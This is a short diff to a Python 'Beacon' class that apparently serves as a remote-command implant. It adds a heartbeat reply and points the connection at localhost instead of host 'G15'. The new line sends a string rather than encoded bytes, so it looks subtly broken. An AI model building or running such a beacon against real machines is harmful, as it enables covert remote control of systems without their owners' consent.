@@ -61,6 +61,8 @@ class Beacon:
                      self.run_command(split[1])
                   elif split[0] == "quit":
                      self.terminate()
+                  elif split[0] == "heartbeat":
+                     self.sock.send("ACTIVE")
                   else:
                      self.sock.send("Unknown Error".encode())
                except socket.timeout:
@@ -74,7 +76,7 @@ class Beacon:
          self.sock.close()
 
 def main():
-   beacon = Beacon("G15",10267)
+   beacon = Beacon("127.0.0.1",10267)
    beacon.start()
 
 main()
